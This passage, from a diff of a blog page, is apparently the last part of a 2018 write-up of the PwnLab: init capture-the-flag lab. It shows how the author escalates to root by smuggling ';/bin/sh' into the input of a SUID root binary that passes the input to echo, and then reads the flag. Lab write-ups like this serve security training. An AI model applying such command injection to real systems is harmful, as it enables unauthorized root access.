+</span><span class='line'>.:/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games:</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Running the binary turns us into mike!</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>kane@pwnlab:~$ ./msgmike
+</span><span class='line'>./msgmike
+</span><span class='line'>mike@pwnlab:~$</span></code></pre></td></tr></table></div></figure>
+
+
+<p>In mike&rsquo;s home there is another SUID binary, this time owned by root. We can see where this is going..</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>-rwsr-sr-x 1 root root 5.3K Mar 17  2016 msg2root
+</span><span class='line'>mike@pwnlab:/home/mike$ ./msg2root
+</span><span class='line'>./msg2root
+</span><span class='line'>Message for root: pwn incoming
+</span><span class='line'>pwn incoming
+</span><span class='line'>pwn incoming</span></code></pre></td></tr></table></div></figure>
+
+
+<p>This binary takes an input and outputs it to the screen, while also appending it to a file in root&rsquo;s home (below line is taken from strings output)</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>/bin/echo %s &gt;&gt; /root/messages.txt</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We can chain commands by passing a string for the echo function and then adding a second command with <code>;</code>:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>./msg2root 
+</span><span class='line'>./msg2root 
+</span><span class='line'>Message for root: hey;/bin/sh
+</span><span class='line'>hey;/bin/sh
+</span><span class='line'>hey
+</span><span class='line'># </span></code></pre></td></tr></table></div></figure>
+
+
+<p>We&rsquo;re root now! Read the flag and game over:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'># cat flag.txt
+</span><span class='line'>cat flag.txt
+</span><span class='line'>.-=~=-.                                                                 .-=~=-.
+</span><span class='line'>(__  _)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(__  _)
+</span><span class='line'>(_ ___)  _____                             _                            (_ ___)
+</span><span class='line'>(__  _) /  __ \                           | |                           (__  _)
+</span><span class='line'>( _ __) | /  \/ ___  _ __   __ _ _ __ __ _| |_ ___                      ( _ __)
+</span><span class='line'>(__  _) | |    / _ \| '_ \ / _` | '__/ _` | __/ __|                     (__  _)
+</span><span class='line'>(_ ___) | \__/\ (_) | | | | (_| | | | (_| | |_\__ \                     (_ ___)
+</span><span class='line'>(__  _)  \____/\___/|_| |_|\__, |_|  \__,_|\__|___/                     (__  _)
+</span><span class='line'>( _ __)                     __/ |                                       ( _ __)
+</span><span class='line'>(__  _)                    |___/                                        (__  _)
+</span><span class='line'>(__  _)                                                                 (__  _)
+</span><span class='line'>(_ ___) If  you are  reading this,  means  that you have  break 'init'  (_ ___)
+</span><span class='line'>( _ __) Pwnlab.  I hope  you enjoyed  and thanks  for  your time doing  ( _ __)
+</span><span class='line'>(__  _) this challenge.                                                 (__  _)
+</span><span class='line'>(_ ___)                                                                 (_ ___)
+</span><span class='line'>( _ __) Please send me  your  feedback or your  writeup,  I will  love  ( _ __)
+</span><span class='line'>(__  _) reading it                                                      (__  _)
+</span><span class='line'>(__  _)                                                                 (__  _)
+</span><span class='line'>(__  _)                                             For sniferl4bs.com  (__  _)
+</span><span class='line'>( _ __)                                claor@PwnLab.net - @Chronicoder  ( _ __)
+</span><span class='line'>(__  _)                                                                 (__  _)
+</span><span class='line'>(_ ___)-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-=-._.-(_ ___)
+</span><span class='line'>`-._.-'               </span></code></pre></td></tr></table></div></figure>
+
+
+<p>This was a nice challenge with the LFI twist! A new technique added to our repertoire, and another boot2root completed!</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'> ____________________________________
+</span><span class='line'>/ You're currently going through a   \
+</span><span class='line'>| difficult transition period called |
+</span><span class='line'>\ "Life."                            /
+</span><span class='line'> ------------------------------------
+</span><span class='line'>        \   ^__^
+</span><span class='line'>         \  (oo)\_______
+</span><span class='line'>            (__)\       )\/\
+</span><span class='line'>                ||----w |
+</span><span class='line'>                ||     ||</span></code></pre></td></tr></table></div></figure>
+
+
+
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">chousensha</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2018-08-25T17:01:13-04:00" pubdate data-updated="true">Aug 25<span>th</span>, 2018</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/penetration-testing/'>penetration testing</a>, <a class='category' href='/blog/categories/writeups/'>writeups</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="//twitter.com/share" class="twitter-share-button" data-url="http://chousensha.github.io/blog/2018/08/25/pwnlab-init/" data-via="chous3nsha" data-counturl="http://chousensha.github.io/blog/2018/08/25/pwnlab-init/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2018/06/09/destroy-the-necromancer/" title="Previous Post: Destroy The Necromancer">&laquo; Destroy The Necromancer</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+  <section>
+    <h1>Comments</h1>
+    <div id="disqus_thread" aria-live="polite"><noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
+</div>
+  </section>
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>whoami</h1>
+  <p>switch (interests){<br>
+ case INFORMATION SECURITY:<br>
+Mostly offensive security, but trying to be well-rounded in everything;<br>
+case PYTHON:<br>
+Mainly security and sysadmin related scripting;<br>
+case LINUX:<br>
+Greetings from /dev/null;<br>
+case JAPANESE:<br>
+Language, anime, samurai;<br>
+case MARTIAL ARTS:<br>
+If it's fighting I like it;<br>
+case MILITARY SCIENCE:<br>
+Ancient, medieval, modern;<br>
+default: GAMING;}</p>
+</section>
+<section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2018/08/25/pwnlab-init/">Pwnlab: init</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2018/06/09/destroy-the-necromancer/">Destroy The Necromancer</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2018/05/26/got-a-stapler/">Got a Stapler?</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2018/05/13/hacking-the-milnet/">Hacking the Milnet</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2018/05/04/dropping-droopy/">Dropping Droopy</a>
+      </li>
+    
+  </ul>
+</section>
+
+<section>
+  <h1>GitHub Repos</h1>
+  <ul id="gh_repos">
+    <li class="loading">Status updating...</li>
+  </ul>
+  
+  <a href="https://github.com/chousensha">@chousensha</a> on GitHub
+  
+  <script type="text/javascript">
+    $(document).ready(function(){
+        if (!window.jXHR){
+            var jxhr = document.createElement('script');
+            jxhr.type = 'text/javascript';
+            jxhr.src = '/javascripts/libs/jXHR.js';
+            var s = document.getElementsByTagName('script')[0];
+            s.parentNode.insertBefore(jxhr, s);
+        }
+
+        github.showRepos({
+            user: 'chousensha',
+            count: 5,
+            skip_forks: true,
+	    skip_repos: [ "chousensha.github.io" ],
+            target: '#gh_repos'
+        });
+    });
+  </script>
+  <script src="/javascripts/github.js" type="text/javascript"> </script>
+</section>
+
+
+<section>
+  <h1>Latest Tweets</h1>
+  <ul id="tweets">
+    <a class="twitter-timeline" data-dnt="true" href="https://twitter.com/chous3nsha" data-widget-id="733738822597550081" data-link-color="#1863a1" data-tweet-limit="3" data-chrome="noheader nofooter transparent noscrollbar">Tweets by @chous3nsha</a>
+    <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+"://platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}}(document,"script","twitter-wjs");</script>
+  </ul>
+  
+    <a href="http://twitter.com/chous3nsha" class="twitter-follow-button" data-show-count="true">Follow @chous3nsha</a>
+  
+</section>
+
+<section>
+  <h1>Blogroll</h1>
+  <p><a href="https://blog.g0tmi1k.com/">g0tmi1k</a></p>
+  <p><a href="http://redteamjournal.com/">Red Team Journal</a></p>
+  <p><a href="https://www.corelan.be/">Corelan Team</a></p>
+  <p><a href="http://www.madirish.net/">Mad Irish</a></p>
+  <p><a href="http://redteams.net/blog/">redteams.net</a></p>
+  <p><a href="https://www.mattandreko.com/">MattAndreko.com</a></p>
+  <p><a href="http://blog.portswigger.net/">Portswigger Web Security</a></p>
+  <p><a href="http://blog.cobaltstrike.com/">Cobalt Strike blog</a></p>
+  <p><a href="https://highon.coffee/blog/">HighOn.Coffee</a></p>
+  <p><a href="https://pentestlab.blog/">Penetration Testing Lab</a></p
+</section>
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2018 - chousensha -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a></span>
+</p>
+
+</footer>
+  
+
+<script type="text/javascript">
+      var disqus_shortname = 'coredumpoverflow';
+      
+        
+        // var disqus_developer = 1;
+        var disqus_identifier = 'http://chousensha.github.io/blog/2018/08/25/pwnlab-init/';
+        var disqus_url = 'http://chousensha.github.io/blog/2018/08/25/pwnlab-init/';
+        var disqus_script = 'embed.js';
+      
+    (function () {
+      var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
+      dsq.src = '//' + disqus_shortname + '.disqus.com/' + disqus_script;
+      (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
+    }());
+</script>
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = '//platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
